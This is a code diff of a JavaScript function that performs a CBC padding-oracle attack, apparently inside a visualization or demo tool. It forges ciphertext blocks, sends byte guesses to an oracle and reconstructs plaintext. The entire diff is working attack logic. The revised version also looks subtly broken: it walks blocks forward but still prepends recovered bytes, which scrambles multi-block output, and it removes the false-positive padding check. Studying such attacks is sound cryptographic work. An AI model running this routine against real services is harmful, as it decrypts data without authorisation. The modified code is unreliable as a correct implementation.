@@ -14,100 +14,83 @@ export async function runPaddingAttack(
   let totalBytes = (blocks.length - 1) * 16;
   let processed = 0;
 
-  const BATCH = 16;
+  for (let b = 1; b < blocks.length; b++) {
+    const prev = blocks[b - 1];
+    const curr = blocks[b];
 
-  for (let b = blocks.length - 1; b > 0; b--) {
-    let intermediate = new Uint8Array(16);
     let recovered = new Uint8Array(16);
+    let modified = new Uint8Array(prev); // working copy
 
     for (let i = 15; i >= 0; i--) {
       const pad = 16 - i;
-
       let found = false;
 
-      for (let k = 0; k < 256; k += BATCH) {
-        const promises = [];
+      for (let guess = 0; guess < 256; guess++) {
+        // reset modified block
+        modified = new Uint8Array(prev);
 
-        for (let guess = k; guess < k + BATCH; guess++) {
-          const forged = new Uint8Array(originalBytes);
+        // apply padding to solved bytes
+        for (let k = i + 1; k < 16; k++) {
+          modified[k] =
+            prev[k] ^ recovered[k] ^ pad;
+        }
 
-          // modify previous block
-          const offset = (b - 1) * 16;
+        // set current guess
+        modified[i] = guess;
 
-          for (let j = 15; j > i; j--) {
-            forged[offset + j] =
-              intermediate[j] ^ pad;
-          }
+        // construct forged ciphertext
+        const forged = new Uint8Array(16 + curr.length);
+        forged.set(modified, 0);
+        forged.set(curr, 16);
 
-          forged[offset + i] = guess;
+        const payload = bytesToBase64(forged);
 
-          const payload = bytesToBase64(forged);
+        const res = await oracle(payload);
 
-          promises.push(
-            oracle(payload).then((res) => ({
-              res,
+        if (res.status !== "valid") {
+          if (!fastMode) {
+            onUpdate({
+              block: Number(b),
+              byte:  Number(i),
               guess,
-            }))
-          );
+              status: "invalid",
+            });
+          }
+          continue;
         }
 
-        const results = await Promise.all(promises);
+        // ---- VALID BYTE FOUND ----
+        recovered[i] = guess ^ pad ^ prev[i];
 
-        for (const r of results) {
-          if (r.res.status !== "valid") continue;
+        plaintextBytes.unshift(recovered[i]);
+        processed++;
 
-          // ---- FALSE POSITIVE CHECK ----
-          const forged = new Uint8Array(originalBytes);
-          const offset = (b - 1) * 16;
+        const progress =
+          (processed / totalBytes) * 100;
 
-          forged[offset + i] = r.guess ^ 1; // disturb padding
+        onUpdate({
+          block: b,
+          byte: i,
+          guess,
+          status: "valid",
+          progress,
+          recoveredText: new TextDecoder().decode(
+            new Uint8Array(plaintextBytes)
+          ),
+        });
 
-          const test = await oracle(bytesToBase64(forged));
-
-          if (test.status === "valid") continue;
-
-          // ---- VALID BYTE ----
-          intermediate[i] = r.guess ^ pad;
-
-          const prevByte =
-            originalBytes[offset + i];
-
-          recovered[i] =
-            intermediate[i] ^ prevByte;
-
-          plaintextBytes.unshift(recovered[i]);
-
-          processed++;
-
-          const progress =
-            (processed / totalBytes) * 100;
-
-          onUpdate({
-            block: b,
-            byte: i,
-            guess: r.guess,
-            status: "valid",
-            progress,
-            recoveredText: new TextDecoder().decode(
-              new Uint8Array(plaintextBytes)
-            ),
-          });
-
-          found = true;
-          break;
-        }
-
-        if (found) break;
-
-        if (!fastMode && speed > 0) {
-          await new Promise((r) =>
-            setTimeout(r, speed)
-          );
-        }
+        found = true;
+        break;
       }
 
       if (!found) {
         recovered[i] = 0;
+      }
+
+      if (!fastMode && speed > 0) {
+        await new Promise((r) =>
+          setTimeout(r, speed)
+        );
       }
     }
   }
